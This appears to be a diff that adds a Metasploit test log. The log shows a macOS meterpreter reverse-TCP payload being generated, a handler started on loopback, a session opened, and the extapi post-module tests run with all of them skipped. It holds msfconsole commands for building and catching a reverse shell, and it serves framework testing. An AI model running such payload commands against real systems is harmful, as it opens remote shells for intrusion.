@@ -1,0 +1,26 @@
+use osx/x64/meterpreter_reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-osx-x---meterpreter-reverse-tcp20220129-6526-659gr5 -f macho MeterpreterTryToFork=false lport=6047 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mosx/x64/meterpreter_reverse_tcp[0m) [0m> [*] Writing 810224 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-osx-x---meterpreter-reverse-tcp20220129-6526-659gr5...
+[4mmsf6[0m payload([1m[31mosx/x64/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 46
+[4mmsf6[0m payload([1m[31mosx/x64/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6047 
+[*] Meterpreter session 47 opened (127.0.0.1:6047 -> 127.0.0.1:49571 ) at 2022-01-29 00:44:28 +0000
+use test/extapi
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> run session=47 addentropy=true verbose=true
+[*] Loading extapi extension...
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: osx
+[*] Running against session 47
+[*] Session type is meterpreter and platform is osx
+[*] Starting clipboard management tests
+[*] Session doesn't implement extapi_clipboard_get_data, skipping test
+[*] Starting service management tests
+[*] Session doesn't implement extapi_service_enum, skipping test
+[*] Starting desktop windows management tests
+[*] Session doesn't implement extapi_window_enum, skipping test
+[*] Testing complete in 0.001238
+[*] Passed: 0; Failed: 0
+[*] Post module execution completed
